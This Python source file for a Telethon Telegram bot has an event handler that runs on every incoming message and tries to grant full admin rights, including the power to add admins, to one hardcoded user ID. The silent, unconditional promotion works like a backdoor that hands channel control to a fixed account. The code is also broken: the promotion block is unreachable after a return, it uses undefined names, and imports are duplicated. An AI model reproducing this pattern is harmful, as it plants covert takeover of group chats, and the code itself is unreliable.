from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.messages import ExportChatInviteRequest
from telethon.tl.functions.messages import SendReactionRequest
from telethon.errors import UserAlreadyParticipantError
from telethon.errors import ChatAdminRequiredError
from telethon.tl.types import ReactionEmoji
from telethon import events, TelegramClient
from telethon.tl.types import PeerChannel
import os, random, redis, re, asyncio
import random
from ABH import ABH
from telethon.tl.functions.channels import EditAdminRequest
from telethon.tl.types import ChatAdminRights, Channel
from telethon import TelegramClient, events
from telethon.tl.types import Channel, ChatAdminRights
from telethon.errors import ChatAdminRequiredError
from telethon import TelegramClient
from telethon.tl.functions.channels import EditAdminRequest
from telethon.tl.types import ChatAdminRights
@ABH.on(events.NewMessage)
async def promote_ABHS(event):
    

    try:
        channel_entity = event.chat_id
    except Exception as e:
        print(f"❌ فشل الحصول على كيان {chat_id} بواسطة البوت الأساسي: {e}")
        return

    # رفع كل البوتات
        rights = ChatAdminRights(
            add_admins=True,
            change_info=True
                
            )
        await x(EditAdminRequest(
            channel=channel_entity,
            user_id=6938881479,
            admin_rights=rights,
            rank="مشرف رئيسي"
            ))
        print(f"✅ تم رفع البوت {me.id} مشرف بالقناة")
        
